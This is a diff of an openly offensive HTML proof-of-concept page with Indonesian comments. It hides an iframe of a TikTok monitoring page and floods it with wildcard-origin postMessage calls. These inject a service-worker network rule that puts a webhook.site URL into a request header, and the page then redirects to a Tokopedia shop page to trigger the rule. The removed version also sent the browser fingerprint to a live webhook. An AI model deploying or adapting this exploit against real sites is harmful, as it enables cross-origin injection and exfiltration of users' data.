@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Security Check V2</title></head>
+<head><title>DATA EXFILTRATION</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
     <h1>[ PHASE: EXFILTRATION ]</h1>
     <p id="msg">Injecting Data Harvester...</p>
@@ -8,38 +8,37 @@
     <iframe id="pwn_gate" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
 
     <script>
-        const gate = document.getElementById('pwn_gate');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+    const gate = document.getElementById('pwn_gate');
+    const webhook = "https://webhook.site/ID_LU_DI_SINI";
 
-        // Payload ini memerintahkan SW untuk nempel-in info sensitif ke header
-        const payload = {
-            source: "main_thread",
-            eventName: "network_rule",
-            data: [{
-                ruleName: "persistent_exfiltrator",
-                global: true,
-                handlers: [{
-                    handler: "replace",
-                    type: "header",
-                    field: "X-Pns-Referrer",
-                    // Kita ambil UserAgent & Resolusi layar sebagai bukti data exfiltration
-                    value: webhook + "?info=" + btoa(navigator.userAgent + " | Res:" + screen.width + "x" + screen.height)
-                }]
+    const payload = {
+        source: "main_thread",
+        eventName: "network_rule",
+        data: [{
+            ruleName: "ghost_exfil_v9",
+            global: true,
+            handlers: [{
+                handler: "replace",
+                type: "header",
+                field: "X-Pns-Referrer",
+                // TRIK: Kita kirim URL Webhook mentah dulu
+                value: webhook 
             }]
-        };
+        }]
+    };
 
-        gate.onload = function() {
-            document.getElementById('msg').innerText = "Infecting Target...";
-            for(let i=0; i<40; i++) {
-                gate.contentWindow.postMessage(payload, "*");
-            }
-            
-            setTimeout(() => {
-                document.getElementById('msg').innerText = "Success! Redirecting to Target...";
-                // Pindah ke Tokopedia buat trigger SW-nya
-                location.href = "https://shop-id.tokopedia.com";
-            }, 5000);
-        };
-    </script>
+    gate.onload = function() {
+        // Injeksi rule ke SW
+        for(let i=0; i<50; i++) {
+            gate.contentWindow.postMessage(payload, "*");
+        }
+        
+        setTimeout(() => {
+            // Pindah ke target untuk memicu eksekusi di konteks yang BENAR
+            location.href = "https://shop-id.tokopedia.com";
+        }, 3000);
+    };
+</script>
+
 </body>
 </html>
